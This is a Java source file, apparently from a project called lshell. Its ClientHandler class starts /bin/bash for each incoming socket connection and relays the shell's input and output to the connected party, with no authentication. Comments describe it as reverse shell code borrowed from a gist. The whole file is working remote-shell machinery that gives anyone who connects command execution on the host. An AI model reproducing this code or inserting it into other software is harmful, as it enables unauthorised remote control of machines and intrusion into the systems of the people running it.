package com.github.theslabby.lshell.common;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;




//reverse shell code borrowed from: https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76

public class ClientHandler extends Thread{

	//define all clients
	public static List<ClientHandler> clients = Collections.synchronizedList(new ArrayList<ClientHandler>());
	
	final Socket client;
	final BufferedReader in;
	final PrintWriter out;
	
	
	public ClientHandler(Socket client) throws IOException {
		System.out.println("New connection from "+client.getInetAddress().getHostAddress());
		this.client = client;
		this.in = new BufferedReader(new InputStreamReader(client.getInputStream()));
		this.out = new PrintWriter(client.getOutputStream());
		
		//add to clients list
		synchronized(clients) {
			clients.add(this);
		}
	}
	
	public void run() {
		
		
		try {
			
			
			String cmd = "/bin/bash"; //linux bash location! (i really hope your not running on windows lol)
			Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
			
			//setup streams
			InputStream pi = p.getInputStream(), pe = p.getErrorStream();
			OutputStream po = p.getOutputStream(), so = this.client.getOutputStream();
			//BufferedReader processReader = new BufferedReader(new InputStreamReader(pi));
			//PrintWriter processWriter = new PrintWriter(po);

			
			InputReader reader = new InputReader(this);
			reader.start();
			
			//reverse shell code
			while (!this.client.isClosed()) {
								
				while (pi.available() > 0) so.write(pi.read());
				while (pe.available() > 0) so.write(pe.read());
				
				//use the reader class so we can check if connection is alive
				String input = "";
				synchronized(reader) {
					input = reader.getQueue();
				}
				po.write(input.getBytes());
				
				so.flush();
				po.flush();
				try {
					p.exitValue();
					break;
				} catch (Exception e) {}
			}
			p.destroy();
		}catch(IOException e) {
			System.out.println("Can't write to client "+client.getInetAddress().getHostAddress() + ", attempting close...");
		}
		this.close();
		System.out.println("Client "+client.getInetAddress().getHostAddress() + " closed!");
	}
	
	public void close() {
		try {
			this.client.close();
		} catch (IOException e) {
			e.printStackTrace();
		}
		
		//removed from clients list
		synchronized(clients) {
			if (clients.contains(this)){
				clients.remove(this);
			}
		}
	}
	
	public void send(String message) {
		out.println(message);
	}
	
	//InputReader is so that we can keep reading input to check if connection is alive. (ctrl+c)
	class InputReader extends Thread{
		
		private ClientHandler client;
		private String queue;
		
		public InputReader(ClientHandler client) {
			this.client = client;
			this.queue = "";
		}
		
		public void run() {
			BufferedReader reader;
			try {
				reader = new BufferedReader(new InputStreamReader(client.client.getInputStream()));
				while(true) {
					try {
						String line = reader.readLine();
						this.queue = this.queue + line+"\n";
					} catch (IOException e) {
						break;
					}
					
				}
			} catch (IOException e) {System.out.println("Error, attempting closing socket");}
			client.close();
		}
		
		public String getQueue() {
			String temp = queue;
			queue = ""; //clear out queue
			return temp;
		}
		
	}
	
}
